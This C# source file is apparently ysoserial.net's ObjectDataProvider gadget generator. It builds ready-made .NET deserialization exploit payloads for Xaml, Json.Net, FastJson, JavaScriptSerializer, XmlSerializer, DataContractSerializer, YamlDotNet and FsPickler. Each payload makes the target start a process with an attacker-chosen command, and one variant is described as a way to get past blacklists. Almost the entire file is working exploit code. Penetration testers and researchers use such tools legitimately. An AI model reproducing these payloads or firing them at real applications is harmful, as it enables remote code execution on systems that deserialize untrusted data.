﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using fastJSON;
using Newtonsoft.Json;
using System.Web.Script.Serialization;
using System.Xml;
using System.Xml.Serialization;
using YamlDotNet.Serialization;
using System.Windows.Markup;
using System.Diagnostics;
using System.Windows.Data;
using System.Reflection;
using System.Collections.Specialized;
using System.Windows;
using ysoserial.Helpers;

/*
 * NOTEs:
 *  What is Xaml2? 
 *      Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
 *  What is DataContractSerializer2? 
 *      DataContractSerializer2 uses Xaml.Parse rather than using ObjectDataProvider directly (as in DataContractSerializer) which is useful for bypassing blacklists
 * 
 * 
 * */

namespace ysoserial.Generators
{
    class ObjectDataProviderGenerator : GenericGenerator
    {
        public override string Description()
        {
            return "ObjectDataProvider gadget";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Xaml", "Xaml2", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "DataContractSerializer2", "YamlDotNet < 5.0.0", "FsPickler" };
        }

        public override string Name()
        {
            return "ObjectDataProvider";
        }

        public override string Finders()
        {
            return "Oleksandr Mirosh and Alvaro Munoz";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeNotDerived };
        }
        
        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
            if (formatter.ToLower().Equals("xaml") || formatter.ToLower().Equals("xaml2"))
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                
                psi.FileName = inputArgs.CmdFileName;
                if (inputArgs.HasArguments)
                {
                    psi.Arguments = inputArgs.CmdArguments;
                }

                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;
                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;

                string payload = "";

                if (formatter.ToLower().Equals("xaml2"))
                {
                    ResourceDictionary myResourceDictionary = new ResourceDictionary();
                    myResourceDictionary.Add("", odp);
                    payload = XamlWriter.Save(myResourceDictionary);
                }
                else
                {
                    payload = XamlWriter.Save(odp);
                }
                
                if (inputArgs.Minify)
                {
                    // using discardable regex array to make it shorter!
                    payload = XMLMinifier.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.Xaml_deserialize(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            if (formatter.ToLower().Equals("json.net"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                string cmdPart = "";

                if (inputArgs.HasArguments)
                {
                    cmdPart = "'" + inputArgs.CmdFileName + "', '" + inputArgs.CmdArguments + "'";
                }
                else
                {
                    cmdPart = "'" + inputArgs.CmdFileName + "'";
                }

                String payload = @"{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':[" + cmdPart + @"]
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JSONMinifier.Minify(payload, new String[] { "PresentationFramework", "mscorlib", "System" }, null);
                    }
                    else
                    {
                        payload = JSONMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fastjson"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @""",""Arguments"":""" + inputArgs.CmdArguments + @"""";
                }
                else
                {
                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @"""";
                }

                String payload = @"{
    ""$types"":{
        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
        ""System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
        ""System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
    },
    ""$type"":""1"",
    ""ObjectInstance"":{
        ""$type"":""2"",
        ""StartInfo"":{
            ""$type"":""3"",
            " + cmdPart + @"
        }
    },
    ""MethodName"":""Start""
}";

                if (inputArgs.Minify)
                {
                    payload = JSONMinifier.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        var instance = JSON.ToObject<Object>(payload);

                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("javascriptserializer"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "', 'Arguments':'" + inputArgs.CmdArguments + "'";
                }
                else
                {
                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "'";
                }

                String payload = @"{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'ObjectInstance':{
        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            " + cmdPart + @"
        }
    }
}";

                if (inputArgs.Minify)
                {
                    payload = JSONMinifier.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JavaScriptSerializer_deserialize(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("xmlserializer"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                }
                else
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                }

                String payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
";

                if (inputArgs.Minify)
                {
                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.XMLSerializer, true);
                }


                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.XMLSerializer_deserialize(payload, null, "root");
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer2"))
            {
                // This by mixing what we had already in xmlserializer and datacontractserializer
                // this can be useful to bypass deserializers that are based on a blacklist
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                }
                else
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                }

                String payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
      <ExpandedElement z:Id=""ref1"" >
        <__identity xsi:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
        <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
            <a:MethodName>Parse</a:MethodName>
            <a:MethodParameters>
                <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </a:MethodParameters>
            <a:ObjectInstance z:Ref=""ref1""/>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
</root>
";
                if (inputArgs.Minify)
                {
                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"<b:anyType i:type=""c:string"">" + inputArgs.CmdFileName + @"</b:anyType>
          <b:anyType i:type=""c:string"">" + inputArgs.CmdArguments + "</b:anyType>";
                }
                else
                {
                    cmdPart = $@"<anyType i:type=""c:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">" + inputArgs.CmdFileName + @"</anyType>";
                }

                String payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" 
                                                         xmlns:c=""http://www.w3.org/2001/XMLSchema""
                                                         xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""
                                                         xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/""
                                                         >
      <ExpandedElement z:Id=""ref1"" >
        <__identity i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
      <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
        <a:MethodName>Start</a:MethodName>
        <a:MethodParameters xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
          " + cmdPart + @"
        </a:MethodParameters>
        <a:ObjectInstance z:Ref=""ref1""/>
      </ProjectedProperty0>
    </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
</root>
";
                if (inputArgs.Minify)
                {
                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("yamldotnet"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.YamlDotNet;
                
                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"FileName: " + inputArgs.CmdFileName + @",
					Arguments: " + inputArgs.CmdArguments;
                }
                else
                {
                    cmdPart = $@"FileName: " + inputArgs.CmdFileName;
                }

                String payload = @"
!<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
    MethodName: Start,
	ObjectInstance: 
		!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
			StartInfo:
				!<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
					" + cmdPart + @"

                }
        }
}";
                
                if (inputArgs.Minify)
                {
                    payload = YamlDocumentMinifier.Minify(payload);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.YamlDotNet_deserialize(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fspickler"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
                //Boolean hasArgs;
                //string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                }
                else
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                }

                String internalPayload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";

                internalPayload = CommandArgSplitter.JsonStringEscape(internalPayload);

                String payload = @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
          ""_flags"": ""subtype"",
          ""subtype"": {
            ""Case"": ""NamedType"",
            ""Name"": ""Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"",
            ""Assembly"": {
              ""Name"": ""Microsoft.PowerShell.Editor"",
              ""Version"": ""3.0.0.0"",
              ""Culture"": ""neutral"",
              ""PublicKeyToken"": ""31bf3856ad364e35""
            }
          },
          ""instance"": {
            ""serializationEntries"": [
              {
                ""Name"": ""ForegroundBrush"",
                ""Type"": {
                  ""Case"": ""NamedType"",
                  ""Name"": ""System.String"",
                  ""Assembly"": {
                    ""Name"": ""mscorlib"",
                    ""Version"": ""4.0.0.0"",
                    ""Culture"": ""neutral"",
                    ""PublicKeyToken"": ""b77a5c561934e089""
                  }
                },
                ""Value"": """+ internalPayload + @"""
              }
            ]
          }
    }
  }";

                if (inputArgs.Minify)
                {
                    payload = JSONMinifier.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        var serializer = MBrace.CsPickler.CsPickler.CreateJsonSerializer(true);
                        serializer.UnPickleOfString<Object>(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
